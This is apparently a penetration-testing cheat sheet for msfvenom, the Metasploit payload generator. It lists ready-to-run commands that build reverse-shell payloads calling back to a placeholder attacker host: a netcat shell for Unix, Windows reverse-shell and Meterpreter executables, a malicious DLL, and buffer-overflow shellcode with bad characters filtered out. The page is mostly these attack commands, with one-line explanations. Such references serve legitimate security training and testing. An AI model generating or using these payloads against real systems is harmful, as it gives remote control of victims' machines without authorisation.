---
title: MSFVENOM
summary: A Metasploit module that generates shellcodes.
description: A Metasploit module that generates shellcodes.
---

**[https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework/blob/master/msfvenom)**

## MSFVENOM Basis

Payloads naming convention : \[OS\]/\[arch\]/\[payload\]

 > 
 > **<font color=red>msfvenom --list payloads</font>**</br>
 > List payloads.

## MSFVENOM Linux Reverse Shell


 > 
 > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
 > Generate a Linux reverse shell.

## MSFVENOM Windows Reverse Shell


 > 
 > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o</font> shell<font color=red>.exe</font>**</br>
 > Generate a reverse shell exe.

 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o </font>shell<font color=red>.exe</font>**</br>
 > Generate a meterpreter reverse shell exe.


 > 
 > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
 > Generate a malicious DLL (meterpreter reverse shell).

## MSFVENOM Windows Shellcode (Buffer Overflow)


 > 
 > **<font color=red>msfvenom -p</font> windows/shell_reverse_tcp <font color=red>LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>EXITFUNC=thread -f</font> c <font color=red>-b "</font>\\x00\x07\x08\x2e\x2f\xa0\xa1<font color=red>"</font>**</br>
 > Gen Reverse Shell in Shellcode (specify bad chars).

#### Flags

 > 
 > **<font color=red>-b "</font>\\x00<font color=red>"</font>**</br>
 > Specify bad characters (always put at least null byte).
 > 
 > **<font color=red>-f</font> c**</br>
 > File Type (here it's c file).
 > 
 > **<font color=red>-a</font> x86**</br>
 > Architecture.
